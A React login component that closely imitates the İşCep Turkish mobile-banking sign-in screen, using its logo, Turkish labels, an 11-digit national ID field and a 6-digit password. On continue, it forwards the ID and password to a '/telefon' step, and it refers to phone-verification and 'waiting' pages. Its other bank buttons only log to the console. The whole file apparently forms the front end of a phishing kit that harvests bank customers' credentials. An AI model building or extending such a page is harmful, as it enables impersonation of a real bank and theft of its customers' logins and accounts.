import React, { useEffect, useRef, useCallback, memo } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import './App.css';
import { useAuth } from './AuthContext';
import { useScroll } from './ScrollContext';

const isIOS = () => /iPhone|iPad|iPod/i.test(navigator.userAgent);

function LoginPage() {
  const { state, dispatch } = useAuth();
  const { inputValue = '', passwordValue = '' } = state || {};
  const passwordInputRef = useRef(null);
  const tcInputRef = useRef(null);
  const navigate = useNavigate();
  const location = useLocation();
  const { rightSectionRef } = useScroll();

  const [localState, setLocalState] = React.useState({
    isTcActive: inputValue.length > 0,
    isActive: passwordValue.length > 0,
    isTcBold: inputValue.length > 0,
    showTcError: false,
  });

  const scrollToInput = useCallback((inputRef, offset = 200) => {
    const rightSection = rightSectionRef.current;
    if (!rightSection || !inputRef.current) return;

    const input = inputRef.current;
    const inputRect = input.getBoundingClientRect();
    const viewportHeight = window.visualViewport?.height || window.innerHeight;

    setTimeout(() => {
      requestAnimationFrame(() => {
        if (isIOS()) {
          input.scrollIntoView({ behavior: 'smooth', block: 'center' });
        } else {
          const scrollTo = rightSection.scrollTop + inputRect.top - (viewportHeight - inputRect.height) / 2 + offset;
          rightSection.scrollTo({ top: scrollTo, behavior: 'smooth' });
        }
      });
    }, 200);
  }, [rightSectionRef]);

  useEffect(() => {
    if (location.state?.fromPhoneVerification || location.state?.fromWaitingPage) {
      dispatch({ type: 'RESET_AUTH' });
      setLocalState({
        isTcActive: false,
        isActive: false,
        isTcBold: false,
        showTcError: false,
      });
    }
  }, [location.state, dispatch]);

  useEffect(() => {
    setLocalState((prev) => ({
      ...prev,
      isTcActive: inputValue.length > 0,
      isTcBold: inputValue.length > 0,
      showTcError: false,
    }));
  }, [inputValue]);

  useEffect(() => {
    if (inputValue.length === 11 && passwordInputRef.current) {
      passwordInputRef.current.focus();
      scrollToInput(passwordInputRef);
    }
  }, [inputValue, scrollToInput]);

  useEffect(() => {
    const handleTcFocus = () => scrollToInput(tcInputRef, 100);
    const tcInput = tcInputRef.current;
    if (tcInput) {
      tcInput.addEventListener('focus', handleTcFocus);
    }
    return () => {
      if (tcInput) tcInput.removeEventListener('focus', handleTcFocus);
    };
  }, [scrollToInput]);

  useEffect(() => {
    const meta = document.createElement('meta');
    meta.name = 'viewport';
    meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover, interactive-widget=resizes-visual';
    document.head.appendChild(meta);

    const rightSection = rightSectionRef.current;
    if (!isIOS() && 'virtualKeyboard' in navigator) {
      navigator.virtualKeyboard.overlaysContent = true;
      const handleGeometryChange = () => {
        const kbHeight = navigator.virtualKeyboard.boundingRect.height;
        document.body.style.setProperty('--keyboard-height', `${kbHeight}px`);
        if (rightSection) {
          rightSection.style.paddingBottom = `${kbHeight + 150}px`;
        }
      };
      navigator.virtualKeyboard.addEventListener('geometrychange', handleGeometryChange);
      return () => {
        navigator.virtualKeyboard.removeEventListener('geometrychange', handleGeometryChange);
      };
    } else if (isIOS() && rightSection) {
      rightSection.style.paddingBottom = '150px';
    }

    return () => {
      document.head.removeChild(meta);
    };
  }, [rightSectionRef]);

  const handleNumberInput = useCallback(
    (e, type, maxLength) => {
      const value = e.target.value;
      if (/^\d*$/.test(value) && value.length <= maxLength) {
        dispatch({ type, payload: value });
        setLocalState((prev) => ({
          ...prev,
          ...(type === 'SET_INPUT_VALUE'
            ? { isTcActive: true, isTcBold: value.length > 0, showTcError: false }
            : { isActive: true, showTcError: false }),
        }));
      }
    },
    [dispatch]
  );

  const handleTcKeyDown = useCallback((e) => {
    if ((e.key === 'Backspace' || e.key === 'Delete') && !e.target.value) {
      setLocalState((prev) => ({
        ...prev,
        isTcBold: false,
        isTcActive: true,
      }));
    }
  }, []);

  const handleClearTc = useCallback(
    (e) => {
      e.stopPropagation();
      dispatch({ type: 'CLEAR_TC' });
      setLocalState((prev) => ({
        ...prev,
        isTcActive: true,
        isTcBold: false,
        showTcError: false,
      }));
      tcInputRef.current?.focus();
    },
    [dispatch]
  );

  const handleClearPassword = useCallback(
    (e) => {
      e.stopPropagation();
      dispatch({ type: 'CLEAR_PASSWORD' });
      setLocalState((prev) => ({
        ...prev,
        isActive: true,
        showTcError: false,
      }));
      passwordInputRef.current?.focus();
    },
    [dispatch]
  );

  const handleTcFocus = useCallback(() => {
    setLocalState((prev) => ({
      ...prev,
      isTcActive: true,
      isTcBold: inputValue.length > 0,
    }));
  }, [inputValue]);

  const handleTcBlur = useCallback(() => {
    if (!inputValue.length) {
      setLocalState((prev) => ({
        ...prev,
        isTcActive: false,
        isTcBold: false,
      }));
    }
  }, [inputValue]);

  const handlePasswordFocus = useCallback(() => {
    setLocalState((prev) => ({ ...prev, isActive: true }));
  }, []);

  const handlePasswordBlur = useCallback(
    (e) => {
      const isClearButton = e.relatedTarget?.classList.contains('clear-password-button');
      if (!passwordValue.length && !isClearButton) {
        setLocalState((prev) => ({ ...prev, isActive: false }));
      }
    },
    [passwordValue]
  );

  const handleContinueClick = useCallback(() => {
    if (inputValue.length > 0 && inputValue.length !== 11) {
      setLocalState((prev) => ({ ...prev, showTcError: true }));
      return;
    }
    if (inputValue.length === 11 && passwordValue.length === 6) {
      navigate('/telefon', {
        state: { tc: inputValue, password: passwordValue, isValidNavigation: true },
        replace: true,
      });
    }
  }, [inputValue, passwordValue, navigate]);

  const handleFormSubmit = useCallback(
    (e) => {
      e.preventDefault();
      e.stopPropagation();
      handleContinueClick();
      if (document.activeElement) {
        document.activeElement.blur();
      }
    },
    [handleContinueClick]
  );

  const getTcErrorMessage = () => {
    if (inputValue.length > 0 && inputValue.length !== 11) {
      return 'TCKN veya YKN 11 haneli olmalıdır.';
    }
    return 'Hatalı giriş yaptınız, lütfen tekrar deneyiniz.';
  };

  return (
    <form onSubmit={handleFormSubmit} style={{ touchAction: 'manipulation' }}>
      <div className="container">
        <div className="right-section" ref={rightSectionRef}>
          <img src="/iscep-logo.png" alt="İşCep Logosu" className="iscep-logo" loading="lazy" />
          <div className="user-icon">
            <img src="/user.png" alt="Kullanıcı Simgesi" loading="lazy" />
          </div>
          <div className="new-container">
            Yeni Kullanıcı
            <div className="down-arrow">
              <img src="/down-arrow.png" alt="Aşağı Ok" className="down-arrow-img" loading="lazy" />
            </div>
          </div>
          <div className="new-lower-container">Bireysel</div>
          <div className="input-wrapper">
            <div
              className={`tc-input-wrapper ${localState.showTcError ? 'error' : ''}`}
              onClick={() => tcInputRef.current?.focus()}
            >
              <label
                className={`tc-label ${localState.isTcActive ? 'hovered' : ''}`}
                htmlFor="tc-input"
              >
                Müşteri Numarası /{' '}
                <span className={`tc-label-part ${localState.isTcBold ? 'bold' : ''}`}>
                  TCKN-YKN
                </span>
              </label>
              <input
                id="tc-input"
                ref={tcInputRef}
                type="tel"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength="11"
                value={inputValue}
                onChange={(e) => handleNumberInput(e, 'SET_INPUT_VALUE', 11)}
                onFocus={handleTcFocus}
                onBlur={handleTcBlur}
                onKeyDown={handleTcKeyDown}
                className={localState.showTcError ? 'new-input tc-input error' : 'new-input tc-input'}
                autoComplete="off"
                autoCapitalize="none"
                aria-label="Müşteri Numarası veya TCKN-YKN"
                aria-describedby={localState.showTcError ? 'tc-error' : undefined}
              />
              {inputValue.length > 0 && (
                <button
                  className="clear-tc-button"
                  type="button"
                  onClick={handleClearTc}
                  onTouchStart={handleClearTc}
                  aria-label="TCKN-YKN temizle"
                >
                  ✕
                </button>
              )}
              {localState.showTcError && (
                <div id="tc-error" className="tc-error" role="alert" aria-live="assertive">
                  <img
                    src="/error.png"
                    alt="Hata Simgesi"
                    className="error-icon"
                    loading="lazy"
                    onError={() => console.warn('Hata simgesi yüklenemedi')}
                  />
                  {getTcErrorMessage()}
                </div>
              )}
            </div>
            <div
              className={`action-links ${inputValue.length === 11 ? 'shifted' : ''} ${
                localState.showTcError ? 'error-shifted' : ''
              }`}
            >
              <button
                className="action-link become-customer"
                type="button"
                onClick={() => console.log('Müşteri Olmak İstiyorum tıklandı')}
              >
                MÜŞTERİ OLMAK İSTİYORUM
              </button>
              <button
                className="action-link create-password"
                type="button"
                onClick={() => console.log('Şifre Oluştur tıklandı')}
              >
                ŞİFRE OLUŞTUR
              </button>
            </div>
            {inputValue.length === 11 && (
              <div className="password-input-wrapper">
                <label
                  className={`password-label ${localState.isActive ? 'hovered' : ''}`}
                  htmlFor="password-input"
                >
                  Şifre
                </label>
                <div className="password-input-container">
                  <input
                    id="password-input"
                    ref={passwordInputRef}
                    type="password"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    maxLength="6"
                    value={passwordValue}
                    onChange={(e) => handleNumberInput(e, 'SET_PASSWORD_VALUE', 6)}
                    onFocus={handlePasswordFocus}
                    onBlur={handlePasswordBlur}
                    className={inputValue.length === 11 ? 'new-input password-input no-right-line' : 'new-input password-input'}
                    autoComplete="new-password"
                    autoCapitalize="none"
                    aria-label="Şifre"
                  />
                  {passwordValue.length > 0 && (
                    <button
                      className="clear-password-button"
                      type="button"
                      onClick={handleClearPassword}
                      onTouchStart={handleClearPassword}
                      aria-label="Şifreyi temizle"
                    >
                      ✕
                    </button>
                  )}
                </div>
                {(passwordValue.length > 0 || localState.isActive) && (
                  <div className="password-overlay">
                    <span className="dots">
                      {[...Array(6)].map((_, index) => (
                        <span
                          key={index}
                          className={`dot ${index < passwordValue.length ? 'active' : 'inactive'}`}
                        />
                      ))}
                    </span>
                  </div>
                )}
              </div>
            )}
            <button
              className={`continue-button ${
                inputValue.length > 0 &&
                (inputValue.length < 11 || (inputValue.length === 11 && passwordValue.length === 6))
                  ? 'active-continue-button'
                  : ''
              } ${inputValue.length === 11 ? 'shifted' : ''} ${
                localState.showTcError ? 'error-shifted' : ''
              }`}
              onClick={handleContinueClick}
              disabled={inputValue.length === 0 || (inputValue.length === 11 && passwordValue.length !== 6)}
              aria-label="Devam et"
            >
              Devam
            </button>
          </div>
          <div className="spacer"></div>
        </div>
      </div>
    </form>
  );
}

export default memo(LoginPage);
